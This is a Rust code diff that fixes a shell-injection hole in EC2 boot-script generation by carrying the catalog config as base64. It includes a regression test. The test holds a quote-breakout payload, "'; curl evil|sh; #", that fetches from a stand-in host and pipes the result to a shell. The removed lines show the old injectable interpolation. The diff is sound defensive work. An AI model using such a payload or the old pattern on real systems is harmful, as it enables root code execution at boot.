@@ -754,6 +754,26 @@ fn cluster_catalog_conf(st: &AppState, default_region: &str) -> String {
     parts.join(";")
 }
 
+/// Build the EC2 boot script for a cluster instance.
+///
+/// SECURITY: only operator-controlled values (`weft_url`, `region`) are interpolated into the shell.
+/// The attached-catalog config — the only attacker-influenced input — is carried as **inert base64**
+/// and decoded into the env var at runtime via a quoted command substitution, so the shell never
+/// re-parses its contents. This removes the user-data injection RCE entirely: even a connection field
+/// that slipped past validation (e.g. a single-quote breakout) is just opaque bytes here, never a
+/// shell literal. (Previously `WEFT_CATALOG_CONF='{catalog_conf}'` let a `'` in a connection uri/name
+/// break out and run as root at boot on an IAM-instance-profile box.)
+fn ec2_user_data(weft_url: &str, region: &str, catalog_conf: &str) -> String {
+    let catalog_b64 = base64_encode(catalog_conf.as_bytes());
+    format!(
+        "#!/bin/bash\nset -e\n\
+         curl -fsSL '{weft_url}' -o /usr/local/bin/weft\nchmod +x /usr/local/bin/weft\n\
+         export AWS_REGION='{region}'\n\
+         export WEFT_CATALOG_CONF=\"$(printf %s '{catalog_b64}' | base64 -d)\"\n\
+         /usr/local/bin/weft spark server --port 50051 > /var/log/weft.log 2>&1 &\n"
+    )
+}
+
 /// Materialize a cluster into a real Spark Connect server process and advance its state. On EKS the
 /// operator would create driver + worker pods here; on this single node it spawns a `weft spark
 /// server` on an allocated port — a genuine, connectable endpoint.
@@ -800,10 +820,9 @@ async fn provision_ec2(st: AppState, id: String) {
 
     // user-data: download the weft binary and run the Spark Connect server on boot, with AWS region
     // + catalog config in the environment so external catalogs (Glue/Hive) resolve on the cluster.
-    let user_data = format!(
-        "#!/bin/bash\nset -e\ncurl -fsSL '{}' -o /usr/local/bin/weft\nchmod +x /usr/local/bin/weft\nexport AWS_REGION='{}'\nexport WEFT_CATALOG_CONF='{}'\n/usr/local/bin/weft spark server --port 50051 > /var/log/weft.log 2>&1 &\n",
-        cfg.weft_url, cfg.region, catalog_conf
-    );
+    // Catalog conf is carried as inert base64 (see `ec2_user_data`) — never interpolated as a shell
+    // literal.
+    let user_data = ec2_user_data(&cfg.weft_url, &cfg.region, &catalog_conf);
     let user_data_b64 = base64_encode(user_data.as_bytes());
 
     let mut args: Vec<String> = vec![
@@ -2804,6 +2823,26 @@ mod tests {
             post(&st, "/api/sql", &bob, r#"{"sql":"SELECT 1"}"#).await,
             StatusCode::OK
         );
+    }
+
+    #[test]
+    fn ec2_user_data_keeps_catalog_conf_inert() {
+        // A connection value carrying a shell-breakout payload must NOT appear raw in the boot
+        // script; it is base64-encoded and decoded at runtime, so the shell never re-parses it.
+        let payload = "spark.sql.catalog.x.uri=thrift://h:9083'; curl evil|sh; #";
+        let ud = ec2_user_data("https://dl/weft", "us-west-2", payload);
+        assert!(
+            !ud.contains("'; curl evil|sh"),
+            "raw payload leaked into boot script:\n{ud}"
+        );
+        assert!(!ud.contains("evil|sh"), "no raw payload anywhere:\n{ud}");
+        assert!(ud.contains("base64 -d"), "conf must be decoded from base64");
+        assert!(
+            ud.contains(&base64_encode(payload.as_bytes())),
+            "conf must be carried as its base64"
+        );
+        // Operator-controlled values are present (not an injection vector).
+        assert!(ud.contains("AWS_REGION='us-west-2'"));
     }
 
     #[tokio::test]
